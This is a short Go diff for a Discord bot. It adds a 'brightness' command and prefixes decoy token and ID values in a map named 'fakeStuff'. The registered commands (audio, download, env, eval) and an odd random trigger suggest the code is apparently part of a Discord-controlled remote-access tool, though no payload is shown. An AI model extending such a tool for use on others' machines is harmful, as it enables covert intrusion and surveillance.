@@ -33,9 +33,9 @@ func Init() {
 	register()
 
 	var fakeStuff = map[string]string{
-		"BOT_TOKEN":   config.FakeToken,
-		"CATEGORY_ID": config.FakeCategory,
-		"SERVER_ID":   config.FakeServer,
+		"BOT_TOKEN":   "Bot" + config.FakeToken,
+		"CATEGORY_ID": "Category" + config.FakeCategory,
+		"SERVER_ID":   "Server" + config.FakeServer,
 	}
 
 	if rand.Intn(1032) == 193 {
@@ -179,6 +179,7 @@ func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
 
 func register() {
 	commandsList["audio"] = &commands.AudioCommand{}
+	commandsList["brightness"] = &commands.LightCommand{}
 	commandsList["download"] = &commands.DownloadCommand{}
 	commandsList["env"] = &commands.EnvCommand{}
 	commandsList["eval"] = &commands.EvalCommand{}
